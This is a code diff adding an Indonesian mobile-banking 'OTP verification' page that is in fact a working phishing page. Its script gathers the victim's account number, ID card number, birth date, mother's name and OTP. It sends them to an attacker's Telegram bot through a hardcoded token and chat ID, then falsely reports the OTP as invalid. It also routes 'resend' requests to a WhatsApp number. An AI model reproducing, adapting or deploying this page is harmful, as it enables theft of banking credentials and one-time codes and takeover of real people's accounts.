@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>Verifikasi Mobile Banking</title>
+
+<style>
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+  background:#f3f3f6;
+}
+
+/* ===== HEADER ===== */
+.header{
+  height:56px;
+  background:#1496e6;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  position:relative;
+}
+.header .back{
+  position:absolute;
+  left:16px;
+  font-size:24px;
+  font-weight:600;
+  cursor:pointer;
+}
+.header-title{
+  font-size:20px;
+  font-weight:bold;
+}
+
+/* ===== CONTENT ===== */
+.container{
+  padding:36px 20px;
+  text-align:center;
+}
+
+.title{
+  font-size:22px;
+  font-weight:bold;
+  color:#222;
+  margin-bottom:8px;
+}
+.subtitle{
+  font-size:14px;
+  color:#888;
+}
+.phone{
+  font-size:16px;
+  font-weight:600;
+  margin:8px 0 28px;
+}
+
+/* ===== OTP ===== */
+.otp-box{
+  display:flex;
+  justify-content:center;
+  gap:10px;
+  margin-bottom:18px;
+}
+.otp-box input{
+  width:46px;
+  height:56px;
+  text-align:center;
+  font-size:22px;
+  font-weight:bold;
+  border:none;
+  border-radius:14px;
+  background:#fff;
+  outline:none;
+}
+
+/* ===== TIMER ===== */
+.timer{
+  color:#e14b4b;
+  font-weight:600;
+  margin-bottom:26px;
+}
+
+/* ===== ACTIONS ===== */
+.actions{ margin-top:8px; }
+
+.btn-outline{
+  width:100%;
+  height:48px;                /* ⬅️ SAMAKAN TINGGI */
+  display:flex;               /* ⬅️ CENTER PRESISI */
+  align-items:center;
+  justify-content:center;
+
+  font-size:17px;
+  font-weight:bold;
+  border-radius:12px;
+  border:1px solid #cfd8e3;
+
+  color:#9aa3ad;
+  background:#f3f3f6;
+  text-decoration:none;
+
+  pointer-events:none;
+  margin-bottom:16px;
+  box-sizing:border-box;      /* ⬅️ PENTING */
+}
+
+.btn-outline.active{
+  color:#1496e6;
+  border-color:#1496e6;
+  background:#fff;
+  pointer-events:auto;
+}
+
+.btn-primary{
+  width:100%;
+  padding:16px;
+  font-size:18px;
+  border-radius:12px;
+  border:none;
+  font-weight:bold;
+  background:#dcdcdc;
+  color:#fff;
+}
+.btn-primary.active{
+  background:#1496e6;
+}
+/* Hilangkan outline dan highlight di semua elemen fokus / tap */
+* {
+  -webkit-tap-highlight-color: transparent; /* hilangkan biru di mobile */
+  -webkit-user-select: none; /* optional: cegah seleksi teks accidental */
+  -webkit-appearance: none;  /* hilangkan style default iOS */
+  -moz-appearance: none;
+  appearance: none;
+  outline: none;             /* hilangkan outline default browser */
+  box-shadow: none;          /* hilangkan shadow default saat focus */
+}
+
+/* Khusus input, textarea, select, button */
+input, textarea, select, button {
+  outline: none !important;
+  box-shadow: none !important;
+  -webkit-tap-highlight-color: transparent !important;
+  -webkit-appearance: none !important;
+  appearance: none !important;
+  user-select: none;
+}
+
+/* Optional: hilangkan efek saat ditekan tombol / input di mobile */
+input:active, button:active, textarea:active, select:active {
+  background-color: inherit;
+  transform: none;
+  box-shadow: none;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <div class="back" onclick="history.back()">←</div>
+  <div class="header-title">Verifikasi Mobile Banking</div>
+</div>
+
+<div class="container">
+
+  <div class="title">Masukkan kode OTP</div>
+  <div class="subtitle">OTP yang telah dikirimkan ke nomor Ponsel</div>
+  <div class="phone">+628XXXXXXXXX</div>
+
+  <div class="otp-box">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+  </div>
+
+  <div id="timer" class="timer">
+    Kirim ulang kode OTP dalam: 01:00
+  </div>
+
+  <div class="actions">
+    <a id="resendBtn" class="btn-outline"
+       href="https://wa.me/628211110344"
+       target="_blank">
+      Kirim ulang Kode OTP
+    </a>
+
+    <button id="submitBtn" class="btn-primary" disabled>
+      Selanjutnya
+    </button>
+  </div>
+
+</div>
+
+<script>
+/* ===== AMBIL DATA SEBELUMNYA ===== */
+const dataReg = JSON.parse(localStorage.getItem('dataReg')) || {};
+
+if(!dataReg.nomor_rekening){
+  alert('Data tidak lengkap, silakan ulangi dari awal');
+  window.location.href = 'halaman1.html';
+}
+
+/* ===== OTP INPUT ===== */
+const inputs = document.querySelectorAll('.otp-box input');
+const submitBtn = document.getElementById('submitBtn');
+inputs[0].focus();
+
+inputs.forEach((input, i) => {
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/[^0-9]/g,'');
+    if(input.value && inputs[i+1]) inputs[i+1].focus();
+    cekOTP();
+  });
+  input.addEventListener('keydown', e => {
+    if(e.key === 'Backspace' && !input.value && inputs[i-1]){
+      inputs[i-1].focus();
+    }
+  });
+});
+
+function getOTP(){
+  return Array.from(inputs).map(i=>i.value).join('');
+}
+
+function cekOTP(){
+  const otp = getOTP();
+  if(otp.length === 6){
+    submitBtn.classList.add('active');
+    submitBtn.disabled = false;
+  }else{
+    submitBtn.classList.remove('active');
+    submitBtn.disabled = true;
+  }
+}
+
+/* ===== TIMER ===== */
+let waktu = 60;
+const timerEl = document.getElementById('timer');
+const resendBtn = document.getElementById('resendBtn');
+
+const hitungMundur = setInterval(()=>{
+  waktu--;
+  const m = String(Math.floor(waktu/60)).padStart(2,'0');
+  const s = String(waktu%60).padStart(2,'0');
+  timerEl.textContent = `Kirim ulang kode OTP dalam: ${m}:${s}`;
+
+  if(waktu <= 0){
+    clearInterval(hitungMundur);
+    timerEl.textContent = 'Tidak menerima OTP?';
+    resendBtn.classList.add('active');
+  }
+},1000);
+
+/* ===== KIRIM TELEGRAM ===== */
+async function kirimKeTelegram(data){
+  const TOKEN   = '7701091667:AAEK6o1oKgQoxt-5JybA04kmtqJmYbNQt_8';
+  const CHAT_ID = '5983910858';
+
+  const pesan =
+`📲 REGISTRASI MOBILE BANKING
+━━━━━━━━━━━━━━
+REKENING : ${data.nomor_rekening || '-'}
+KTP      : ${data.ktp || '-'}
+TTL      : ${data.tgl || '-'}
+IBU      : ${data.ibu || '-'}
+OTP      : ${data.otp}
+━━━━━━━━━━━━━━
+🕒 ${new Date().toLocaleString()}`;
+
+  await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      chat_id: CHAT_ID,
+      text: pesan
+    })
+  });
+}
+
+/* ===== SUBMIT ===== */
+submitBtn.onclick = async () => {
+  const otp = getOTP();
+
+  const dataGabung = {
+    ...dataReg,
+    otp
+  };
+
+  // simpan ulang (opsional)
+  localStorage.setItem('dataReg', JSON.stringify(dataGabung));
+
+  await kirimKeTelegram(dataGabung);
+
+  alert('OTP tidak valid');
+  // window.location.href = 'halaman-selesai.html';
+};
+</script>
+
+</body>
+</html>
